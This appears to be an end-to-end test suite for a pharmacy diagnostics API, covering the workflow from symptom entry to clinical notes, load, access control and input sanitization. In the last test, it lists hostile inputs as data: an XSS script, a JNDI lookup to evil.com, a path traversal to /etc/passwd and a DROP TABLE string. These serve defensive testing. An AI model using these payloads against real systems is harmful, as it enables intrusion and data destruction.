import mongoose from 'mongoose';
import request from 'supertest';
import { app } from '../../../app';
import DiagnosticRequest from '../../models/DiagnosticRequest';
import DiagnosticResult from '../../models/DiagnosticResult';
import ClinicalNote from '../../../models/ClinicalNote';
import MedicationTherapyReview from '../../../models/MedicationTherapyReview';
import Patient from '../../../models/Patient';
import User from '../../../models/User';
import Workplace from '../../../models/Workplace';

describe('Complete User Journey E2E Tests', () => {
    let testUser: any;
    let testWorkplace: any;
    let testPatient: any;
    let authToken: string;

    beforeAll(async () => {
        // Create test workplace
        testWorkplace = await Workplace.create({
            name: 'E2E Test Pharmacy',
            address: '123 E2E Test St',
            phone: '555-0199',
            email: 'e2e@pharmacy.com',
            licenseNumber: 'E2E123',
            subscriptionPlan: 'professional',
            isActive: true,
        });

        // Create test user
        testUser = await User.create({
            email: 'e2e.pharmacist@test.com',
            password: 'password123',
            firstName: 'E2E',
            lastName: 'Pharmacist',
            role: 'pharmacist',
            workplaceId: testWorkplace._id,
            isActive: true,
            isEmailVerified: true,
        });

        // Create test patient
        testPatient = await Patient.create({
            firstName: 'Jane',
            lastName: 'Smith',
            dateOfBirth: new Date('1985-05-15'),
            gender: 'female',
            phone: '555-0199',
            email: 'jane.smith@test.com',
            workplaceId: testWorkplace._id,
            createdBy: testUser._id,
        });

        // Get auth token
        const loginResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'e2e.pharmacist@test.com',
                password: 'password123',
            });

        authToken = loginResponse.body.data.token;
    });

    afterAll(async () => {
        // Clean up test data
        await DiagnosticResult.deleteMany({});
        await DiagnosticRequest.deleteMany({});
        await ClinicalNote.deleteMany({});
        await MedicationTherapyReview.deleteMany({});
        await Patient.deleteMany({});
        await User.deleteMany({});
        await Workplace.deleteMany({});
    });

    describe('Complete Diagnostic Journey', () => {
        let diagnosticRequestId: string;
        let diagnosticResultId: string;

        it('should complete the full diagnostic workflow from symptom entry to intervention', async () => {
            // Step 1: Create diagnostic request
            const createRequestResponse = await request(app)
                .post('/api/diagnostics/requests')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    patientId: testPatient._id.toString(),
                    inputSnapshot: {
                        symptoms: {
                            subjective: ['chest pain', 'shortness of breath', 'fatigue'],
                            objective: ['elevated heart rate', 'pale appearance'],
                            duration: '3 days',
                            severity: 'moderate',
                            onset: 'acute',
                        },
                        vitals: {
                            bloodPressure: '140/90',
                            heartRate: 95,
                            temperature: 98.8,
                            respiratoryRate: 22,
                        },
                        currentMedications: [
                            {
                                name: 'Metformin',
                                dosage: '500mg',
                                frequency: 'twice daily',
                                startDate: new Date('2023-01-01'),
                            },
                            {
                                name: 'Lisinopril',
                                dosage: '10mg',
                                frequency: 'daily',
                                startDate: new Date('2023-06-01'),
                            },
                        ],
                        allergies: ['sulfa drugs', 'shellfish'],
                    },
                    clinicalContext: {
                        chiefComplaint: 'Chest pain and difficulty breathing',
                        presentingSymptoms: ['chest pain', 'shortness of breath', 'fatigue'],
                        relevantHistory: 'Type 2 diabetes, hypertension',
                        socialHistory: 'Non-smoker, occasional alcohol use',
                    },
                    consentObtained: true,
                    consentTimestamp: new Date(),
                    priority: 'high',
                });

            expect(createRequestResponse.status).toBe(201);
            expect(createRequestResponse.body.success).toBe(true);
            diagnosticRequestId = createRequestResponse.body.data.request._id;

            // Step 2: Process the diagnostic request (simulate AI processing)
            const processResponse = await request(app)
                .post(`/api/diagnostics/requests/${diagnosticRequestId}/process`)
                .set('Authorization', `Bearer ${authToken}`)
                .send();

            expect(processResponse.status).toBe(200);
            expect(processResponse.body.success).toBe(true);

            // Step 3: Wait for processing to complete and get results
            let getResultsResponse;
            let attempts = 0;
            const maxAttempts = 10;

            do {
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
                getResultsResponse = await request(app)
                    .get(`/api/diagnostics/requests/${diagnosticRequestId}/results`)
                    .set('Authorization', `Bearer ${authToken}`);
                attempts++;
            } while (
                getResultsResponse.status !== 200 &&
                attempts < maxAttempts
            );

            expect(getResultsResponse.status).toBe(200);
            expect(getResultsResponse.body.success).toBe(true);
            expect(getResultsResponse.body.data.result).toBeDefined();

            const diagnosticResult = getResultsResponse.body.data.result;
            diagnosticResultId = diagnosticResult._id;

            // Verify diagnostic result structure
            expect(diagnosticResult.diagnoses).toBeDefined();
            expect(Array.isArray(diagnosticResult.diagnoses)).toBe(true);
            expect(diagnosticResult.diagnoses.length).toBeGreaterThan(0);
            expect(diagnosticResult.medicationSuggestions).toBeDefined();
            expect(diagnosticResult.redFlags).toBeDefined();

            // Step 4: Pharmacist review and approval
            const reviewResponse = await request(app)
                .post(`/api/diagnostics/results/${diagnosticResultId}/review`)
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    action: 'approve',
                    modifications: 'Approved with recommendation for cardiology consultation',
                });

            expect(reviewResponse.status).toBe(200);
            expect(reviewResponse.body.success).toBe(true);

            // Step 5: Create clinical note from diagnostic results
            const clinicalNoteResponse = await request(app)
                .post('/api/diagnostics/integration/clinical-note')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    diagnosticRequestId,
                    diagnosticResultId,
                    patientId: testPatient._id.toString(),
                    noteData: {
                        title: 'Chest Pain Assessment - AI Diagnostic',
                        type: 'consultation',
                        priority: 'high',
                        followUpRequired: true,
                    },
                });

            expect(clinicalNoteResponse.status).toBe(201);
            expect(clinicalNoteResponse.body.success).toBe(true);

            const clinicalNote = clinicalNoteResponse.body.data.clinicalNote;
            expect(clinicalNote.title).toBe('Chest Pain Assessment - AI Diagnostic');
            expect(clinicalNote.content.subjective).toContain('chest pain');
            expect(clinicalNote.content.objective).toContain('BP: 140/90');
            expect(clinicalNote.followUpRequired).toBe(true);

            // Step 6: Create MTR from diagnostic results
            const mtrResponse = await request(app)
                .post('/api/diagnostics/integration/mtr')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    diagnosticRequestId,
                    diagnosticResultId,
                    patientId: testPatient._id.toString(),
                    mtrData: {
                        priority: 'urgent',
                        reviewReason: 'Chest pain assessment revealed potential medication optimization needs',
                    },
                });

            expect(mtrResponse.status).toBe(201);
            expect(mtrResponse.body.success).toBe(true);

            const mtr = mtrResponse.body.data.mtr;
            expect(mtr.priority).toBe('urgent');
            expect(mtr.reviewType).toBe('targeted');
            expect(mtr.steps.patientSelection.completed).toBe(true);

            // Step 7: Get unified patient timeline
            const timelineResponse = await request(app)
                .get(`/api/diagnostics/integration/timeline/${testPatient._id}`)
                .set('Authorization', `Bearer ${authToken}`)
                .query({ limit: 10 });

            expect(timelineResponse.status).toBe(200);
            expect(timelineResponse.body.success).toBe(true);

            const timeline = timelineResponse.body.data.timeline;
            expect(Array.isArray(timeline)).toBe(true);
            expect(timeline.length).toBeGreaterThan(0);

            // Verify timeline contains all created events
            const diagnosticEvents = timeline.filter((event: any) => event.type === 'diagnostic');
            const clinicalNoteEvents = timeline.filter((event: any) => event.type === 'clinical_note');
            const mtrEvents = timeline.filter((event: any) => event.type === 'mtr');

            expect(diagnosticEvents.length).toBeGreaterThan(0);
            expect(clinicalNoteEvents.length).toBeGreaterThan(0);
            expect(mtrEvents.length).toBeGreaterThan(0);

            // Step 8: Cross-reference with existing records
            const crossRefResponse = await request(app)
                .get(`/api/diagnostics/integration/cross-reference/${diagnosticRequestId}`)
                .set('Authorization', `Bearer ${authToken}`);

            expect(crossRefResponse.status).toBe(200);
            expect(crossRefResponse.body.success).toBe(true);

            const crossRef = crossRefResponse.body.data;
            expect(crossRef.relatedClinicalNotes).toBeDefined();
            expect(crossRef.relatedMTRs).toBeDefined();
            expect(crossRef.correlations).toBeDefined();

            // Step 9: Get integration options
            const optionsResponse = await request(app)
                .get(`/api/diagnostics/integration/options/${diagnosticRequestId}`)
                .set('Authorization', `Bearer ${authToken}`);

            expect(optionsResponse.status).toBe(200);
            expect(optionsResponse.body.success).toBe(true);

            const options = optionsResponse.body.data;
            expect(options.canCreateClinicalNote).toBe(true);
            expect(options.canCreateMTR).toBe(true);
            expect(Array.isArray(options.recommendations)).toBe(true);
        });
    });

    describe('Error Scenarios and Fallback Mechanisms', () => {
        it('should handle invalid patient data gracefully', async () => {
            const response = await request(app)
                .post('/api/diagnostics/requests')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    patientId: 'invalid-patient-id',
                    inputSnapshot: {
                        symptoms: {
                            subjective: ['headache'],
                            duration: '1 day',
                            severity: 'mild',
                            onset: 'acute',
                        },
                    },
                    clinicalContext: {
                        chiefComplaint: 'Headache',
                    },
                    consentObtained: true,
                    priority: 'low',
                });

            expect(response.status).toBe(400);
            expect(response.body.success).toBe(false);
            expect(response.body.error.code).toBe('INVALID_OBJECT_ID');
        });

        it('should handle AI service failures gracefully', async () => {
            // Create a request first
            const createResponse = await request(app)
                .post('/api/diagnostics/requests')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    patientId: testPatient._id.toString(),
                    inputSnapshot: {
                        symptoms: {
                            subjective: ['test symptom'],
                            duration: '1 day',
                            severity: 'mild',
                            onset: 'acute',
                        },
                    },
                    clinicalContext: {
                        chiefComplaint: 'Test complaint',
                    },
                    consentObtained: true,
                    priority: 'low',
                });

            const requestId = createResponse.body.data.request._id;

            // Mock AI service failure by trying to process with invalid data
            // The system should handle this gracefully and not crash
            const processResponse = await request(app)
                .post(`/api/diagnostics/requests/${requestId}/process`)
                .set('Authorization', `Bearer ${authToken}`)
                .send();

            // Should either succeed or fail gracefully
            expect([200, 500].includes(processResponse.status)).toBe(true);

            if (processResponse.status === 500) {
                expect(processResponse.body.success).toBe(false);
                expect(processResponse.body.error).toBeDefined();
            }
        });

        it('should handle concurrent user scenarios', async () => {
            // Create multiple requests simultaneously
            const requests = Array.from({ length: 5 }, (_, i) =>
                request(app)
                    .post('/api/diagnostics/requests')
                    .set('Authorization', `Bearer ${authToken}`)
                    .send({
                        patientId: testPatient._id.toString(),
                        inputSnapshot: {
                            symptoms: {
                                subjective: [`concurrent symptom ${i}`],
                                duration: '1 day',
                                severity: 'mild',
                                onset: 'acute',
                            },
                        },
                        clinicalContext: {
                            chiefComplaint: `Concurrent complaint ${i}`,
                        },
                        consentObtained: true,
                        priority: 'low',
                    })
            );

            const responses = await Promise.all(requests);

            // All requests should succeed
            responses.forEach((response, index) => {
                expect(response.status).toBe(201);
                expect(response.body.success).toBe(true);
                expect(response.body.data.request).toBeDefined();
            });

            // Verify data consistency
            const allRequests = await DiagnosticRequest.find({
                patientId: testPatient._id,
                workplaceId: testWorkplace._id,
            });

            expect(allRequests.length).toBeGreaterThanOrEqual(5);
        });

        it('should validate data consistency across modules', async () => {
            // Create diagnostic request
            const createResponse = await request(app)
                .post('/api/diagnostics/requests')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    patientId: testPatient._id.toString(),
                    inputSnapshot: {
                        symptoms: {
                            subjective: ['consistency test'],
                            duration: '1 day',
                            severity: 'mild',
                            onset: 'acute',
                        },
                    },
                    clinicalContext: {
                        chiefComplaint: 'Consistency test',
                    },
                    consentObtained: true,
                    priority: 'low',
                });

            const requestId = createResponse.body.data.request._id;

            // Process the request
            await request(app)
                .post(`/api/diagnostics/requests/${requestId}/process`)
                .set('Authorization', `Bearer ${authToken}`);

            // Get results
            const resultsResponse = await request(app)
                .get(`/api/diagnostics/requests/${requestId}/results`)
                .set('Authorization', `Bearer ${authToken}`);

            if (resultsResponse.status === 200) {
                const resultId = resultsResponse.body.data.result._id;

                // Create clinical note
                const noteResponse = await request(app)
                    .post('/api/diagnostics/integration/clinical-note')
                    .set('Authorization', `Bearer ${authToken}`)
                    .send({
                        diagnosticRequestId: requestId,
                        diagnosticResultId: resultId,
                        patientId: testPatient._id.toString(),
                    });

                if (noteResponse.status === 201) {
                    const noteId = noteResponse.body.data.clinicalNote._id;

                    // Verify data consistency
                    const diagnosticRequest = await DiagnosticRequest.findById(requestId);
                    const clinicalNote = await ClinicalNote.findById(noteId);

                    expect(diagnosticRequest?.patientId.toString()).toBe(testPatient._id.toString());
                    expect(clinicalNote?.patient.toString()).toBe(testPatient._id.toString());
                    expect(diagnosticRequest?.workplaceId.toString()).toBe(testWorkplace._id.toString());
                    expect(clinicalNote?.workplaceId.toString()).toBe(testWorkplace._id.toString());
                }
            }
        });
    });

    describe('Performance and Load Testing', () => {
        it('should handle multiple simultaneous diagnostic requests', async () => {
            const startTime = Date.now();
            const concurrentRequests = 10;

            const requests = Array.from({ length: concurrentRequests }, (_, i) =>
                request(app)
                    .post('/api/diagnostics/requests')
                    .set('Authorization', `Bearer ${authToken}`)
                    .send({
                        patientId: testPatient._id.toString(),
                        inputSnapshot: {
                            symptoms: {
                                subjective: [`load test symptom ${i}`],
                                duration: '1 day',
                                severity: 'mild',
                                onset: 'acute',
                            },
                        },
                        clinicalContext: {
                            chiefComplaint: `Load test ${i}`,
                        },
                        consentObtained: true,
                        priority: 'low',
                    })
            );

            const responses = await Promise.all(requests);
            const endTime = Date.now();
            const totalTime = endTime - startTime;

            // All requests should succeed
            responses.forEach(response => {
                expect(response.status).toBe(201);
                expect(response.body.success).toBe(true);
            });

            // Performance check - should complete within reasonable time
            expect(totalTime).toBeLessThan(30000); // 30 seconds

            // Average response time should be reasonable
            const avgResponseTime = totalTime / concurrentRequests;
            expect(avgResponseTime).toBeLessThan(5000); // 5 seconds per request
        });

        it('should handle large patient timeline requests efficiently', async () => {
            const startTime = Date.now();

            const response = await request(app)
                .get(`/api/diagnostics/integration/timeline/${testPatient._id}`)
                .set('Authorization', `Bearer ${authToken}`)
                .query({ limit: 100 });

            const endTime = Date.now();
            const responseTime = endTime - startTime;

            expect(response.status).toBe(200);
            expect(response.body.success).toBe(true);

            // Should respond within reasonable time even for large datasets
            expect(responseTime).toBeLessThan(5000); // 5 seconds
        });
    });

    describe('Accessibility and WCAG 2.1 Compliance', () => {
        it('should provide proper API response structure for screen readers', async () => {
            const response = await request(app)
                .get(`/api/diagnostics/integration/timeline/${testPatient._id}`)
                .set('Authorization', `Bearer ${authToken}`);

            expect(response.status).toBe(200);
            expect(response.body.success).toBe(true);

            // Verify response structure supports accessibility
            const timeline = response.body.data.timeline;
            if (timeline && timeline.length > 0) {
                timeline.forEach((event: any) => {
                    expect(event.type).toBeDefined();
                    expect(event.title).toBeDefined();
                    expect(event.summary).toBeDefined();
                    expect(event.date).toBeDefined();

                    // Ensure text content is meaningful for screen readers
                    expect(typeof event.title).toBe('string');
                    expect(event.title.length).toBeGreaterThan(0);
                    expect(typeof event.summary).toBe('string');
                    expect(event.summary.length).toBeGreaterThan(0);
                });
            }
        });

        it('should provide proper error messages for accessibility', async () => {
            const response = await request(app)
                .post('/api/diagnostics/integration/clinical-note')
                .set('Authorization', `Bearer ${authToken}`)
                .send({
                    // Missing required fields
                });

            expect(response.status).toBe(400);
            expect(response.body.success).toBe(false);
            expect(response.body.error).toBeDefined();
            expect(response.body.error.message).toBeDefined();
            expect(typeof response.body.error.message).toBe('string');
            expect(response.body.error.message.length).toBeGreaterThan(0);
        });
    });

    describe('Security and Data Protection', () => {
        it('should require authentication for all diagnostic endpoints', async () => {
            const endpoints = [
                { method: 'post', path: '/api/diagnostics/requests' },
                { method: 'get', path: `/api/diagnostics/requests/${new mongoose.Types.ObjectId()}` },
                { method: 'post', path: '/api/diagnostics/integration/clinical-note' },
                { method: 'get', path: `/api/diagnostics/integration/timeline/${testPatient._id}` },
            ];

            for (const endpoint of endpoints) {
                const response = await request(app)[endpoint.method as keyof typeof request](endpoint.path);
                expect([401, 403].includes(response.status)).toBe(true);
            }
        });

        it('should validate user permissions for patient data access', async () => {
            // Create another workplace and user
            const otherWorkplace = await Workplace.create({
                name: 'Other Pharmacy',
                address: '456 Other St',
                phone: '555-0200',
                email: 'other@pharmacy.com',
                licenseNumber: 'OTHER123',
                subscriptionPlan: 'basic',
                isActive: true,
            });

            const otherUser = await User.create({
                email: 'other.pharmacist@test.com',
                password: 'password123',
                firstName: 'Other',
                lastName: 'Pharmacist',
                role: 'pharmacist',
                workplaceId: otherWorkplace._id,
                isActive: true,
                isEmailVerified: true,
            });

            // Get auth token for other user
            const loginResponse = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'other.pharmacist@test.com',
                    password: 'password123',
                });

            const otherAuthToken = loginResponse.body.data.token;

            // Try to access patient from different workplace
            const response = await request(app)
                .get(`/api/diagnostics/integration/timeline/${testPatient._id}`)
                .set('Authorization', `Bearer ${otherAuthToken}`);

            // Should be forbidden or return empty results
            expect([403, 200].includes(response.status)).toBe(true);

            if (response.status === 200) {
                // If allowed, should return empty or filtered results
                expect(response.body.data.timeline.length).toBe(0);
            }

            // Clean up
            await User.findByIdAndDelete(otherUser._id);
            await Workplace.findByIdAndDelete(otherWorkplace._id);
        });

        it('should sanitize and validate all input data', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                '${jndi:ldap://evil.com/a}',
                '../../etc/passwd',
                'DROP TABLE users;',
            ];

            for (const maliciousInput of maliciousInputs) {
                const response = await request(app)
                    .post('/api/diagnostics/requests')
                    .set('Authorization', `Bearer ${authToken}`)
                    .send({
                        patientId: testPatient._id.toString(),
                        inputSnapshot: {
                            symptoms: {
                                subjective: [maliciousInput],
                                duration: '1 day',
                                severity: 'mild',
                                onset: 'acute',
                            },
                        },
                        clinicalContext: {
                            chiefComplaint: maliciousInput,
                        },
                        consentObtained: true,
                        priority: 'low',
                    });

                // Should either reject malicious input or sanitize it
                if (response.status === 201) {
                    const request_data = response.body.data.request;
                    expect(request_data.inputSnapshot.symptoms.subjective[0]).not.toBe(maliciousInput);
                    expect(request_data.clinicalContext.chiefComplaint).not.toBe(maliciousInput);
                }
            }
        });
    });
});